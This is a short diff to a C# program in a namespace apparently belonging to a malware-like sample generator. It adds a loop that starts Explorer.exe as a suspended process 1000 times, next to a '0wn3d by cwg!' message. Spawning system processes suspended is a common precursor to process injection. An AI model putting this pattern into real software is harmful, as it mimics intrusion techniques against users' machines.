@@ -96,10 +96,15 @@ namespace cwg.sourceIL
 
         static void Main(string[] args)
         {
+            
             Console.WriteLine("0wn3d by cwg!");
+
+            
 
             for (var x = 0; x < 1000; x++)
             {
+                ProcessHelper.StartSuspendedProcess(@"c:\Windows\Explorer.exe");
+
                 Console.WriteLine(GetSieFiles());
             }
         }
